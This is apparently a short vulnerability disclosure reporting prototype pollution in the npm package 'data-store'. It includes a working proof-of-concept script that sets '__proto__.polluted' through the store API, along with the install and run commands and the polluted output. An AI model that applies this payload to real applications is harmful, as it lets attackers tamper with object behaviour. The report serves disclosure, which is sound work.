# Description

`data-store` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
const store = require('data-store')({ path: process.cwd() + '/foo.json' });
store.set('__proto__.polluted', 'Yes! Its Polluted');
console.log(store.get('polluted'))
```

2. Execute the following commands in terminal:

```
npm i data-store # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Yes! Its Polluted
```
